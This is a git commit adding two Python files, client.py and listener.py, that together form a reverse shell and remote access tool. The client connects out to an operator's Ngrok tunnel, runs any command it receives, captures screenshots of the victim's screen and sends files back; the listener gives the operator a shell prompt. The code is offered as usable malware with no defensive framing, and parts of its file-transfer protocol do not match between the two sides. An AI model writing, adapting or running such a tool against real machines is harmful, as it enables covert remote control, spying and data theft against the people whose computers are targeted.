7ed915226645e59273cbf866d6b2608cc5742a2e
Adam_el_adeb <107454738+Adameladeb@users.noreply.github.com>
2023-05-20 18:21:33 +0000

    Add files via upload

---
+++ client.py
@@ -0,0 +1,84 @@
+import socket
+import subprocess
+from PIL import ImageGrab
+import os
+
+def connect_to_listener(host, port):
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((host, port))
+
+    while True:
+        command = client.recv(4096).decode()
+
+        if command.lower() == "exit":
+            break
+
+        if command.lower() == "screenshot":
+            send_screenshot(client)
+        elif command.lower() == "upload":
+            send_files(client)
+        elif command.lower() == "download":
+            client.send(command.encode())
+            download_file(client)
+        elif command.lower().startswith("cd "):
+            client.send(command.encode())
+        else:
+            output = subprocess.getoutput(command)
+            client.send(output.encode())
+
+    client.close()
+
+def send_screenshot(client):
+    screenshot = ImageGrab.grab()
+    screenshot.save("screenshot.jpg", "JPEG")
+
+    with open("screenshot.jpg", "rb") as file:
+        data = file.read(4096)
+        while data:
+            client.send(data)
+            data = file.read(4096)
+
+    client.send(b"DONE")
+    print("[*] 🖼️ Screenshot sent")
+
+def send_files(client):
+    file_paths = input("💾 Enter the file path(s) to upload (separated by spaces): ").split()
+
+    client.send(str(len(file_paths)).encode())
+
+    for file_path in file_paths:
+        if os.path.isfile(file_path):
+            client.send(file_path.encode())
+
+            with open(file_path, "rb") as file:
+                data = file.read(4096)
+                while data:
+                    client.send(data)
+                    data = file.read(4096)
+
+            client.send(b"DONE")
+            print(f"[*] File '{os.path.basename(file_path)}' uploaded successfully")
+        else:
+            print(f"[!] File '{file_path}' does not exist")
+
+def download_file(client):
+    file_name = input("💾 Enter the file name to download: ")
+    client.send(file_name.encode())
+
+    response = client.recv(4096).decode()
+    if response == "FILE_NOT_FOUND":
+        print("[!] File not found on the remote machine")
+    else:
+        with open(file_name, "wb") as file:
+            while True:
+                data = client.recv(4096)
+                if data == b"DONE":
+                    break
+                file.write(data)
+
+        print(f"[*] 📥 File '{file_name}' downloaded successfully")
+
+if __name__ == "__main__":
+    host = "NGROK_TUNNEL_URL"  # Replace with your Ngrok tunnel URL
+    port = 1234  # Replace with your listener's port number
+    connect_to_listener(host, port)
---
+++ listener.py
@@ -0,0 +1,92 @@
+import socket
+import subprocess
+import os
+
+def start_listener(host, port):
+    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    listener.bind((host, port))
+    listener.listen(1)
+    print(f"🔊 [*] Listening on {host}:{port}")
+
+    client_socket, addr = listener.accept()
+    print(f"🤝 [*] Received connection from {addr[0]}:{addr[1]}")
+
+    while True:
+        command = input("💻 Shell> ")
+
+        if command.lower() == "exit":
+            break
+
+        if command.lower() == "screenshot":
+            client_socket.send(command.encode())
+            receive_screenshot(client_socket)
+        elif command.lower() == "upload":
+            client_socket.send(command.encode())
+            upload_files(client_socket)
+        elif command.lower() == "download":
+            client_socket.send(command.encode())
+            download_file(client_socket)
+        elif command.lower().startswith("cd "):
+            client_socket.send(command.encode())
+        else:
+            client_socket.send(command.encode())
+            response = client_socket.recv(4096).decode()
+            print(response)
+
+    client_socket.close()
+    listener.close()
+
+def receive_screenshot(client_socket):
+    screenshot_data = b""
+    while True:
+        data = client_socket.recv(4096)
+        if data == b"DONE":
+            break
+        screenshot_data += data
+
+    with open("screenshot.jpg", "wb") as file:
+        file.write(screenshot_data)
+
+    print("[*] 🖼️ Screenshot received and saved as 'screenshot.jpg'")
+
+def upload_files(client_socket):
+    file_count = int(client_socket.recv(4096).decode())
+    print(f"[*] Uploading {file_count} file(s)")
+
+    for _ in range(file_count):
+        file_path = client_socket.recv(4096).decode()
+        if os.path.isfile(file_path):
+            file_name = os.path.basename(file_path)
+            client_socket.send(file_name.encode())
+
+            with open(file_path, "rb") as file:
+                data = file.read(4096)
+                while data:
+                    client_socket.send(data)
+                    data = file.read(4096)
+
+            client_socket.send(b"DONE")
+            print(f"[*] File '{file_name}' uploaded successfully")
+        else:
+            print(f"[!] File '{file_path}' does not exist")
+
+def download_file(client_socket):
+    file_name = client_socket.recv(4096).decode()
+
+    if file_name == "FILE_NOT_FOUND":
+        print("[!] File not found on the remote machine")
+        return
+
+    with open(file_name, "wb") as file:
+        while True:
+            data = client_socket.recv(4096)
+            if data == b"DONE":
+                break
+            file.write(data)
+
+    print(f"[*] 📥 File '{file_name}' downloaded successfully")
+
+if __name__ == "__main__":
+    host = "NGROK_TUNNEL_URL"  # Replace with your Ngrok tunnel URL
+    port = 1234  # Choose a port number
+    start_listener(host, port)
